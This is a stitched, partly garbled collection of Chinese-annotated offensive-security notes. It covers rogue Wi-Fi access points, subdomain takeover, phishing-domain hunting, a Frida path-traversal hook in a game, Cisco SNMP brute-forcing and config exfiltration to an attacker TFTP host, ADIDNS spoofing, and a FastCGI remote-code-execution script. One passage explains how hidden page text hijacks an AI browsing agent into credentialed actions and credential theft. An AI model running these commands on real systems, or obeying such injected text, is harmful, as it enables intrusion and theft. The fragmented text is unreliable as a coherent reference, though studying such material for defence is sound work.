leaktshark -i "$IFACE" -Y eap -V | grep "Identity: *[a-z]\|*[A-Z]\|*[0-9]" # 2. TLS 1.3 realities in 2024–2025 1234# hostapd-wpe.conf ssl_ctx_flags=0 openssl_ciphers=RSA+AES:@SECLEVEL=0 # requires OpenSSL 1.1.1 disable_tlsv1_3=1 # 3. Rogue infra quick note 12apt-get install libssl1.0-dev# patch hostapd-wpe to set verify_peer=0 in SSL_set_verify to accept any client cert # 工具与参考入口 EAP-TLS: The most secure option? It might be possible that every subdomain is allowed to access CORS resources from the main domain or other subdomains. This could be exploited by an attacker to access sensitive information abusing CORS requests. It could be possible that the subdomain is allowed to send cookies to the domain or other subdomains which was prevented by the Same-Site attribute of the cookies. However, note that anti-CSRF tokens will still prevent this attack if they are properly implemented. It might be possible that the compromised subdomain is allowed to be used in the redirect uri URL of an OAuth flow. This could be exploited by an attacker to steal the OAuth 令牌. It might be possible that the compromised subdomain (or every subdomain) is allowed to be used for example the script-src of the CSP. This could be exploited by an attacker to inject malicious scripts and abuse potential XSS vulnerabilities. Look for orphaned cloud assets: verify S3/CloudFront, Azure Websites, GCP App Engine/Storage, GitHub Pages, Heroku, Fastly, Netlify, Vercel, Zendesk, Shopify, Atlassian, and similar services. Passive DNS and historical records: old CNAMEs often reveal previously used third-party services that may still be vulnerable. # 工具与参考入口 https://github.com/EdOverflow/can-i-take-over-xyz https://github.com/blacklanternsecurity/bbot https://github.com/punk-security/dnsReaper https://github.com/haccer/subjack https://github.com/anshumanbh/tko-sub https://github.com/ArifulProtik/sub-domain-takeover https://github.com/SaadAhmedx/Subdomain-Takeover https://github.com/Ice3man543/SubOver https://github.com/antichown/subdomain-takeover https://github.com/musana/mx-takeover https://github.com/PentestPad/subzy https://github.com/Stratus-Security/Subdominator https://github.com/NImaism/takeit https://github.com/projectdiscovery/nuclei https://github.com/edoardottt/cariddi https://ctf.zeyu2001.com/2022/nitectf-2022/undocumented-js-api typosquatting Doppelganger domains post for further details Let's Encrypt # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 AD CS 证书攻击 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/侦察与枚举/Detecting Phishing 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Detecting Phishing 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Detecting Phishing 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Detecting Phishing 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Detecting Phishing、Introduction、Domain name variations、Finding suspicious domains、Bitflipping；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Detecting Phishing Introduction Domain name variations Finding suspicious domains Bitflipping Basic checks Advanced checks Hunting by favicon and web fingerprints (Shodan/ZoomEye/Censys) URL telemetry hunting (urlscan.io) Domain age via RDAP (scriptable) TLS/JAx fingerprints to spot AiTM infrastructure Domain names using keywords Certificate Transparency New domains # 核心要点 It's enough to generate a list of the most probable phishing names that an attacker may use and check if it's registered or just check if there is any IP using it. Tip: If you generate a candidate list, also feed it into your DNS resolver logs to detect NXDOMAIN lookups from inside your org (users trying to reach a typo before the attacker actually registers it). Sinkhole or pre-block these domains if policy allows. You can find a short the explanation of this technique in the parent page. Or read the original research in https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/ Attackers may register as many bit-flipping domains as possible related to the victim to redirect legitimate users to their infrastructure. homograph-attacks.md If you have located the login forms of the suspicious domains, you can try to send junk 凭据 and check if it's redirecting you to the victim's domain. Query Shodan: http.favicon. 哈希：309020573 With tooling: look at community 工具 like favfreak to generate hashes and dorks for Shodan/ZoomEye/Censys. Proactively record TLS certificate metadata (issuer, SAN count, wildcard use, validity) for lookalike hosts discovered via CT or urlscan and correlate with DNS age and geolocation. # 命令 / 载荷 / 操作片段 # 1. Hunting by favicon and web fingerprints (Shodan/ZoomEye/Censys) 1234import base64, requests, mmh3url = "https://www.paypal.com/favicon.ico" # change to your brand iconb64 = base64.encodebytes(requests.get(url, timeout=10).content)print(mmh3.hash(b64)) # e.g., 309020573 # 2. URL telemetry hunting (urlscan.io) 123# Search recent scans mentioning your brandcurl -s 'https://urlscan.io/api/v1/search/?q=page.domain:(/.*yourbrand.*/%20AND%20NOT%20yourbrand.com)%20AND%20date:>now-7d' \ -H 'API-Key: <YOUR_URLSCAN_KEY>' | jq '.results[].page.url' # 3. Domain age via RDAP (scriptable) 123456# .com/.net RDAP (Verisign)curl -s https://rdap.verisign.com/com/v1/domain/suspicious-example.com | \ jq -r '.events[] | select(.eventAction=="registration") | .eventDate'# Generic helper using rdap.net redirectorcurl -s https://www.rdap.net/domain/suspicious-example.com | jq # 工具与参考入口 dnstwist urlcrazy https://paypal-financial.com https://0xpatrik.com/phishing-domains/ crt.sh CertStream phishing catcher Whoxy # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 AD CS 证书攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

OnSendFileInit — carries the UTF‑16 filename the client should use when saving the incoming 载荷. Because the server serializes the filename through ByteStreamWriteString () right before sending, a Frida hook can swap the pointer to a traversal 载荷 while keeping packet sizes intact. Overwrite asset archives (RDA files) so that weaponized models, textures, or scripts are loaded live during the same session. Look for RPC verbs named SendFile, 上传，ShareSave, etc., then intercept the serialization helper responsible for filenames or target directories. When the receiver stores files under the game install path, check ACLs via icacls to confirm whether an unprivileged user can drop code there. # 命令 / 载荷 / 操作片段 # 1. Subverting file-transfer RPCs 12345678910111213const writeStr = ptr('0x1003A250');const ByteStreamWriteString = new NativeFunction(writeStr, 'pointer', ['pointer', 'pointer']);const evil = Memory.allocUtf16String('..\\..\\..\\..\\Sauvegarde.sww');Interceptor.attach(writeStr, { onEnter(args) { const src = args[1].readPointer(); const value = src.readUtf16String(); if (value && value.indexOf('Sauvegarde.sww') !== -1) { args[1].writePointer(evil); } }}); # 工具与参考入口 RDAExplorer Synacktiv – Exploiting Anno 1404 RDA File Format notes # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 Pwn 基础链路 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/侦察与枚举/Cisco SNMP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Cisco SNMP 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Cisco SNMP 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Cisco SNMP 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Cisco SNMP、Pentesting Cisco Networks、SNMPv3 targets are still worth attacking、Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB)、Metasploit goodies；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Cisco SNMP Pentesting Cisco Networks SNMPv3 targets are still worth attacking Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB) Metasploit goodies Recent Cisco SNMP footguns and vulnerabilities (2024：2025) Hardening & 检测 tips # 核心要点 A classic--yet still extremely effective--attack vector is to brute-force community strings in order to elevate from unauthenticated user to device administrator (RW community). For generic OID walking and broader 枚举，see the main SNMP page. On Cisco gear, do not stop just because Nmap or Nessus fingerprints the service as SNMPv3: pentests routinely find v1/v2c communities and v3 users side by side. If the device only exposes SNMPv3, user 枚举 and 密码 guessing are still practical. Once you recover a RW SNMPv3 user, the same config-copy MIB can be abused to exfiltrate or merge configurations. Recent tooling automates both the dump and the write-back workflow: cisco config tftp：downloads running-config/startup-config via TFTP after abusing the same MIB. Exploitability still depends on possessing the community string or v3 凭据 in most cases, which is exactly why brute-forcing, trap harvesting, and config theft remain relevant against Cisco devices. # 命令 / 载荷 / 操作片段 # 1. Pentesting Cisco Networks 1onesixtyone -c community_strings.txt -i targets.txt # 2. Pentesting Cisco Networks 12nmap -sU -p161 --script snmp-brute --script-args brute.community=wordlist 10.0.0.0/24hydra -P wordlist.txt -s 161 10.10.10.1 snmp # 3. SNMPv3 targets are still worth attacking 12345# Enumerate SNMPv3 usernames / guess passwords./snmpwn.rb --hosts targets.txt --users users.txt --passlist passwords.txt --enclist passwords.txt# Trigger a Cisco config download over SNMPv3./config-dump.py -t 192.168.66.1 -a SHA -A 'AuthPass!' -x AES -X 'PrivPass!' -u netmon -s 10.10.14.8 # 4. Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB) 12nmap -sU -p161 --script snmp-ios-config \ --script-args creds.snmp=:private,snmp.version=v2c 192.168.66.1 # 5. Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB) 1234567891011121314# Copy running-config (4) to a TFTP server (1) using row id 1234snmpset -v2c -c private -m +CISCO-CONFIG-COPY-MIB 192.168.66.1 \ ccCopyProtocol.1234 i 1 \ ccCopySourceFileType.1234 i 4 \ ccCopyDestFileType.1234 i 1 \ ccCopyServerAddress.1234 a 10.10.14.8 \ ccCopyFileName.1234 s backup.cfg \ ccCopyEntryRowStatus.1234 i 4# Check state / failure cause and then destroy the rowsnmpget -v2c -c private -m +CISCO-CONFIG-COPY-MIB 192.168.66.1 \ ccCopyState.1234 ccCopyFailCause.1234snmpset -v2c -c private -m +CISCO-CONFIG-COPY-MIB 192.168.66.1 \ ccCopyEntryRowStatus.1234 i 6 # 6. Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB) 123456sudo cisco-snmp-pwner dump --listen 10.10.14.8 --target 192.168.66.1 \ --version 2c --communitystring privatesudo cisco-snmp-pwner add-user --listen 10.10.14.8 --target 192.168.66.1 \ --version 2c --communitystring private \ --username pwned --password '[REDACTED_SECRET]$' # 7. Metasploit goodies 12345use auxiliary/scanner/snmp/cisco_config_tftpset RHOSTS 10.10.100.10set COMMUNITY privateset OUTPUTDIR /tmp/cisco-configsrun # 8. Hardening & 检测 tips 12snmp-server group SECURE v3 priv snmp-server user monitor SECURE v3 auth sha <authpass> priv aes 256 <privpass> # 工具与参考入口 onesixtyone Cisco: How To Copy Configurations To and From Cisco Devices Using SNMP # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Navigation: The agent browses to an attacker domain with valid TLS that is framed as the “official IT portal.” Capture: The victim enters 凭据 into the phishing page inside the hosted browser; 凭据 are exfiltrated to attacker infra. The agent will typically present the login inside a virtualized browser pane and request user handoff for 凭据. Clipboard/pastejacking (ClickFix) and mobile phishing also deliver credential theft without obvious attachments or executables. Agent has 工具: navigate, click, fill forms, read page text, copy/paste, 上传 / 下载，etc. Attacker hosts a page that visually looks benign but contains near-invisible overlaid text with agent-targeted instructions (low-contrast color on similar background, off-canvas overlay later scrolled into view, etc.). The injected text directs the agent to use its 工具 to perform cross-origin actions under the victim’s cookies/tokens. Attacker hosts a page whose visible text contains imperative instructions crafted for the agent. Victim asks the agent to visit the attacker URL; on load, the page text is fed into the model. The injection enters via untrusted content extraction (OCR/DOM), not the chat textbox, evading input-only sanitization. Same-Origin Policy does not protect against an agent that willfully performs cross-origin actions with the user’s 凭据. Place 载荷 inside regions likely preserved in screenshots (headers/footers) or as clearly-visible body text for navigation-based setups. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/侦察与枚举/AD DNS Records 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD DNS Records 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 AD DNS Records 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 AD DNS Records 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：AD DNS Records、Creating / Modifying records (ADIDNS spoofing)、PowerMad / Invoke-DNSUpdate (PowerShell)、Impacket – dnsupdate.py (Python)、BloodyAD；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AD DNS Records Creating / Modifying records (ADIDNS spoofing) PowerMad / Invoke-DNSUpdate (PowerShell) Impacket – dnsupdate.py (Python) BloodyAD Common attack primitives Internal service hijacking via stale dynamic records (NATS case study) 检测 & hardening # 核心要点 By default any user in Active Directory 域 can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer (users can list the child objects of a DNS zone in an AD environment). The tool adidnsdump enables 枚举 and exporting of all DNS records in the zone for 侦察 purposes of internal networks. adidnsdump v1.4.0 (April 2025) adds JSON/Greppable (--json) output, multi-threaded DNS resolution and support for TLS 1.2/1.3 when binding to LDAPS For more information read https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/ Because the Authenticated Users group has Create Child on the zone DACL by default, any domain account (or computer account) can register additional records. This can be used for traffic hijacking, NTLM 中继 coercion or even full domain compromise. Wildcard record – *.<zone> turns the AD DNS server into an enterprise-wide responder similar to LLMNR/NBNS spoofing. It can be abused to capture NTLM hashes or to relay them to LDAP/SMB. (Requires WINS-lookup to be disabled.) If dynamic updates are required, set the zone to Secure-only and enable Name Protection in DHCP so that only the owner computer object can overwrite its own record. Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to CN=MicrosoftDNS,DC=DomainDnsZones. Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached CVSS 9.8 and are remotely exploitable against Domain Controllers. # 命令 / 载荷 / 操作片段 # 1. AD DNS Records 1234567891011121314git clone https://github.com/dirkjanm/adidnsdumpcd adidnsdumppip install .# Enumerate the default zone and resolve the "hidden" recordsadidnsdump -u domain_name\\username ldap://10.10.10.10 -r# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones# Dump a specific zone (e.g. ForestDnsZones)adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -rcat records.csv # 2. PowerMad / Invoke-DNSUpdate (PowerShell) 1234567Import-Module .\Powermad.ps1# Add A record evil.domain.local → attacker IPInvoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose# Delete it when doneInvoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose # 3. Impacket – dnsupdate.py (Python) 12# add/replace an A record via secure dynamic-updatepython3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37 # 4. BloodyAD 1bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37 # 5. Internal service hijacking via stale dynamic records (NATS case study) 1dig @dc01.mirage.htb nats-svc.mirage.htb # 6. Internal service hijacking via stale dynamic records (NATS case study) 1234nsupdate> server 10.10.11.78> update add nats-svc.mirage.htb 300 A 10.10.14.2> send # 7. Internal service hijacking via stale dynamic records (NATS case study) 12# Capture a single INFO line from the real service and replay it to victimsnc 10.10.11.78 4222 | head -1 | nc -lnvp 4222 # 工具与参考入口 adidnsdump # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 Windows 原生工具利用 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Find reachable sockets via SSRF: if an HTTP service is exploitable for SSRF, try gopher://127.0.0.1:9000/... 载荷 to hit the FastCGI listener. Nginx misconfigs: cgi.fix pathinfo=1 with fastcgi split path info errors let you append /.php to static files and reach PHP (code exec via traversal). It's quite easy to make FastCGI execute arbitrary code: <summary>Send FastCGI request that prepends PHP 载荷 </summary> PHP-FPM log manipulation (CVE-2024-9026): when catch workers output = yes, attackers who can send FastCGI requests may truncate or inject up to 4 bytes per log line to erase indicators or poison logs. Classic Nginx + cgi.fix pathinfo misconfig: still widely seen; if fastcgi param SCRIPT FILENAME documentrootdocument rootdocumentrootfastcgi script name; is used without file existence checks, any path ending in .php gets executed, enabling 路径穿越 or source overwrite style gadgets. # 命令 / 载荷 / 操作片段 # 1. RCE 1234567891011121314151617#!/bin/bashPAYLOAD="<?php echo '';"FILENAMES="/var/www/public/index.php" # Exisiting file pathHOST=$1B64=$(echo "$PAYLOAD"|base64)for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT cat $OUTPUTdone # 工具与参考入口 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 FastCGI library 整数溢出 leading to RCE CVE-2024-9026 PHP-FPM log manipulation analysis # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 SSRF 服务端请求伪造 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
